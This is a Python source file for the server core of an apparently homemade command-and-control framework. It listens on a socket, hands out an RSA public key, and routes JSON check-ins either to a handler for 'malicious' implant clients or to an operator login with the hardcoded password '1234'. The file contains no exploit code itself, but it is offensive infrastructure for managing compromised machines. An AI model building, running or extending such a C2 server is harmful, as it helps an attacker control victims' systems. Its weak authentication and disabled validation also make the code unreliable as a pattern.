#!/bin/python3

try:
    import subprocess as sp
    import socket
    import threading
    import time
    import os
    import random
    import atexit
    from datetime import datetime, timezone
    import select
    import logging
    import argparse
    import json
    import math
    import threading
    import traceback

    # My Modules
    #import json_parser_dev as json_parser
    import Modules.DataHandlers.json_parser_dev as json_parser
    from Modules.DataHandlers.Encryption import Encryptor

    from Modules.Handlers.ServerFriendlyClientHandler import ServerFriendlyClientHandler
    from Modules.Handlers.ServerMaliciousClientHandler import ServerMaliciousClientHandler
    from Modules.Handlers.ServerNetworkCommHandler import send_msg, receive_msg
    from Modules.ServerUtils import str_encode, bytes_decode

except Exception as e:
    print(f"[server.py] Import Error: {e}")
    exit()

#import httpserver.httpserver as httpserver

"""
Argparse settings first in order to be able to change anything
"""
parser = argparse.ArgumentParser()
parser.add_argument('--ip', help="The IP to listen on (0.0.0.0 is a good default", required=True)
parser.add_argument('--port', help="The port to listen on", required=True)
parser.add_argument('--quiet', help="No output to console", action='store_true')
parser.add_argument('--fileserverport', help="what port for the file server", default=80)

args = parser.parse_args()
ip = args.ip
port = int(args.port)
quiet = args.quiet
fileserverport = args.fileserverport

"""
Here's the global Debug + Logging settings. 
Global Debug print to screen will be a setting in the future
"""
if not quiet:
    global_debug = True
else:
    global_debug = False
    
##Reference: https://realpython.com/python-logging/
logging.basicConfig(level=logging.DEBUG)
## Change the path to the system path + a log folder/file somewhere
logging.basicConfig(filename='server.log', filemode='a', format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', force=True, datefmt='%Y-%m-%d %H:%M:%S')
if global_debug:
    logging.getLogger().addHandler(logging.StreamHandler())
    

################
## Initial Handler
################ 
    """
    This is the first thing that friendly, and malicious clients talk to. 
    
    Flow:
    (this is a loop)
    |                      / if header is !_client_! -> (new thread) ServerMaliciousClientHandler                  \                            |
    | Receive connection -> if HTTP request, redirect to website (in this case, youtube)                             | Else: throw logging.warn | Loop
    | (start_server)       \ if header is !_userlogin_!, login handler -> (new thread) ServerFriendlyClientHandler /                            |
    
    """

class ServerSockHandler:
    def __init__(self):
        logging.debug(f"===== Startup | Reference Time (UTC) {datetime.now(timezone.utc)} =====")
        self.server_password = "1234"
        ##Errors relevant to this funtion
        self.Sx01 = "conn_broken_pipe: A pipe was broken"
        self.Sx02 = "Socket Close: The socket was successfully closed"
        self.Sx03 = "Socket Timeout: The socket timed out"
        self.Sx04 = "Socket Permission Error: You most likely don'y have permissions to open a socket"
        self.Sx05 = "Connection Refused, Reset or aborted: "
        self.Sx10 = "client_unkown_input: An unkown input was receieved from the client"
        self.SxXX = "Unkown error: "
        ## Other Values
        self.http_redirect = "https://youtube.com"
        ##== Clients & lists
        self.clients = {}
        self.current_clients = []
        self.friendly_current_clients = []
        self.friendly_clients = {}

        ## init per-client details. these exist so there are no unknown variable errors later
        self.client_type = ""
        self.id = None
        self.message = ""
        self.action = ""
        self.response = ""

        ## Modules
        ## This compiles the JSON schema and returns it
        #bypassing for now. 
        self.json_parser = json_parser.json_ops()

        # generating global priv & pub keys
        self.encryption = Encryptor(key_length=2048)
        self.encryption.generate_keys()

        # sanity check that keys got generated
        #print(len(encryption.private_key))
        #print(len(encryption.public_key))

    def start_server(self, ip, port):
        """
        Description: This is the starting point for this class, it listens for connections,
        and passes them off to connection_handler()
                        
        ip (str): The IP for the server to listen on
        port (int): The port for the server to listen on
        """
    ##== Initial Connection (these are server connections, NOT client connetions)
        
    ##!! dev note, in future iterations maybe add a webserver component, using post & get commands instead of this
    ## custom protocol stuff - who knows
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # this allows the socket to be reelased immediatly on crash/exit
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            self.ADDR = (ip,port)
            self.server.bind(self.ADDR)
            ## A cleanup function incase of crash/on exit
            atexit.register(self.socket_cleanup)
            ## starting listener
            self.server.listen()
            self.connection_handler()
            logging.debug(f"[Server] Server started, and listening: {self.ADDR}")
        ##Exceptions: https://docs.python.org/3/library/exceptions.html#TimeoutError
        except TimeoutError as e:
            logging.warning(f"{self.Sx03}: \n ERRMSG: {e}\n")
        except PermissionError as e:
            logging.warning(f"{self.Sx04}: \nERRMSG:{e}\n")
        except (ConnectionRefusedError, ConnectionResetError, ConnectionAbortedError) as e:
            logging.warning(f"{self.Sx05}: \nERRMSG:{e}\n")
        except Exception as e:
            logging.warning(f"ERRMSG: {e}\n")
                
    def socket_cleanup(self):
        """A cleanup function that is run on any type of exit. it makes sure the socket is closed properly
        & no errors are run into. Left fairly empty for now, may have more use in the future.
            
        Called by start_server
            """
        try:
            ## closing the connection
            self.server.close()
            logging.debug(self.Sx02)
        except Exception as e:
            logging.warning(f"{self.SxXX}:{e}")                
        
    def connection_handler(self):
        """The loop that handles the conections, and passes them off to respective threads/classes
            
        It's a bit messy
            
        """
        while True:
        ##== Initial  handling of client
            try:
                self.conn, addr = self.server.accept()

                ## Getting client id from the client, and the IP address
                self.client_remote_ip_port = f"{self.conn.getpeername()[0]}:{self.conn.getpeername()[1]}"
                logging.debug(f"\n[{self.client_remote_ip_port} -> Server] [New Instance] Accepted Connection from: {self.client_remote_ip_port}")
                        
            except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
                logging.warning(f"[Server (connection_handler)] Client {self.client_remote_ip_port} disconnected")
            except Exception as e:
                logging.debug("[Server (connection_handler)] Unkown Error: {e}")                

        ##== Parsing the message sent to the server. 
            try:
                # English: Hey, I (server) wants to recieve a message. Not sure if encrypted or not, passing my private key to decrypt just in case
                self.response = receive_msg(conn=self.conn, private_key=self.encryption.private_key)

                #print(self.response)
                ## this whole section needs a rework
                if self.response == "PUBKEY_REQUEST":
                    logging.debug(f"[Server (PUBKEY_REQUEST)] {self.client_remote_ip_port} requested the Public Key")

                    #Note, the pubkey is a byte object. send_msg does the handling for byte to str if necessary.
                    send_msg(conn=self.conn, msg=self.encryption.public_key)#.decode()

                else:
                    #English: Making sure whatever data sent to me is valid JSON that follows the schema I'm looking for
                    #NOte, vailadation is disabled
                    incoming_message = self.json_parser.convert_and_validate(self.response)

                    ## maybe get a typecheck in here, or create one in the ServerUtils
                    if incoming_message: 
                        self.client_type = incoming_message["general"]["client_type"]
                        self.id = incoming_message["general"]["client_id"]
                        self.message = incoming_message["msg"]["msg_command"]
                        ## action to be performed
                        self.action = incoming_message["general"]["action"]
                        #Client Pubkey
                        #self.client_pubkey = incoming_message["Main"]["general"]["client_pubkey"]

                        print(f"MSG Breakdown\n\tSelf.client_type: {self.client_type}\n\tself.id: {self.id}\n\tself.message: {self.message}\n\tself.action: {self.action}\n\n")

                    #English: I don't recognize this data schema/format. Killing the connection just to be safe
                    else:
                        logging.warning(f"[Server (connection_handler)] Unrecognized JSON, killing connection")
                        self.conn.close()

            except Exception as e:
                """ These can go away, defined in init
                self.client_type = "None"
                self.message = "None"
                self.id = "None"
                """
                logging.debug(f"No message, or ID value was recieved. , error={e}")
                print(traceback.format_exc())
                             
        ##== The decision handler based on the client_type, which can be:
            ## !_clientlogin_!: A malicious client "logging" in
            ## !_userlogin_!: A friendly client trying to log in    
            
            ## == Decisions based on parsed messages
            if self.action == "!_userlogin_!":
                username, password = None, None
                try:
                    # Try to extract the username and password from the message
                    #username, password = self.id, self.message
                    username = self.id = incoming_message["general"]["client_id"]
                    password = self.id = incoming_message["general"]["password"]
                except ValueError as e:
                    # If there is a value error, set the username and password to None
                    logging.debug(f"Value error with login, credentials probably passed wrong: {e}")
                except Exception as e:
                    # If there is any other exception, set the username and password to None
                    logging.debug(f"Unknown error with logon process: {e}")


                ## all friendly clients are refered to with !!~ infront of their name (has to do with identifying them in the gloabls function)
                friendly_client_name = f"!!~{username}"                    
                ## Running the authentication check, and starting the friendly client thread if successful
                if self.password_eval(password):
                    try:
                        ##== sending the a-ok on successful authentication
                        #self.conn.send(str_encode("0"))

                        #self.send_msg_global(msg="0")
                        send_msg(msg="0", conn=self.conn)

                        logging.debug(f"[Server (Logon)] Successful Logon from: {friendly_client_name}")
                        # Add friendly client to current clients list
                        self.friendly_current_clients.append(friendly_client_name)
                            
                        ## This adds the class instance to the globals list, with the name being friendly_client_name. This allows
                        ## it to be accessed in other parts of the code, and is the backbone of how all this works. 
                        ## additionally, this is where the connection is passed off to the ServerFriendlyClientHandler class
                        self.friendly_clients[friendly_client_name] = ServerFriendlyClientHandler(self.conn, self.ADDR, self.json_parser)
                        globals()[friendly_client_name] = self.friendly_clients[friendly_client_name]

                        ## == Thread handler
                        # Create thread for the friendly client's communication
                        threading.Thread(
                            target=self.friendly_clients[friendly_client_name].friendly_client_communication,
                            args=(self.response, username)
                            ).start()

                    except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
                        logging.warning(f"Friendly Client {friendly_client_name} disconnected")
                    except Exception as e:
                        logging.warning(f"[Error]:{e}")
                        
                ## On failed authentication, sending back a 1 & log
                else:
                    #self.conn.send(str_encode("1"))
                    send_msg(msg="1", conn=self.conn)
                    logging.critical(f"[{self.client_remote_ip_port} -> Server (Logon)] Failed logon from '{username}'")                
            
            ## !_client_! handler
            elif self.action == "!_clientlogin_!":
                # construct client name based on its IP and ID (IP & ID help avoid collisions in naming)
                client_name = "client_" + self.conn.getpeername()[0].replace(".", "_") + "_" + self.id

                # If client is not in current clients list, add it
                if client_name not in self.current_clients:
                    self.current_clients.append(client_name)

                    # Create a new malicious client handler instance and add it to the clients dict
                    self.clients[client_name] = ServerMaliciousClientHandler()
                    globals()[client_name] = self.clients[client_name]

                # Create a new thread for this client's communication
                threading.Thread(
                    target=self.clients[client_name].handle_client,
                    args=(self.conn, self.response, self.id)
                    ).start()                    
            ## Getting rid of any http traffic that made its way to the c2 server instead of the webserver
            elif any(method in self.client_type for method in ["GET", "HEAD", "POST", "INFO", "TRACE"]): ## sends a 403 denied via web browser/for scrapers
                ## I should capture these too and see whos hitting it
                ## immediatly drop connection, and mayyyybe add to a blocklist, but you could lose legit clients that way
                self.conn.close()
                logging.debug("Recieved HTTP Request to C2 server... closing connection")
                
            else:
                logging.warning(f"Unexpected Connection from {self.client_remote_ip_port}. Received: {self.response} ")
                self.conn.close()

    def password_eval(self, password=None) -> bool:
        """
        The password eval function. returns true if successful. Will be encrypted when I get around to that

        password (str): the password given by the client
        """
        ## decrypt pass
        _password = str(password)
        if _password == None:
            logging.debug("[Server (password_eval)] Password with value of 'None' passed to the password eval function")
        
        ## the else covers my ass for any potential injection/rifraff with the None parameter
        else:
            if _password == self.server_password:
                return True
            else:
                return False
#if __name__ == "__main__":
if fileserverport == port:
    logging.critical(f"[SERVER] Fileserver ({fileserverport}) & Listenserver ({port}) port are the same. They need to be different ")

#fs_thread = threading.Thread(target=httpserver.fileserver_start, kwargs={'ip': "0.0.0.0",'port': fileserverport})
#fs_thread.start()

#Data.json_create()
try:
    s = ServerSockHandler()
    s.start_server(ip, port)
except KeyboardInterrupt as ke:
    print("\n[server.py] Kill Signal received, shutting down")
except Exception as e:
    print(f"[server.py] Error occured: {e}")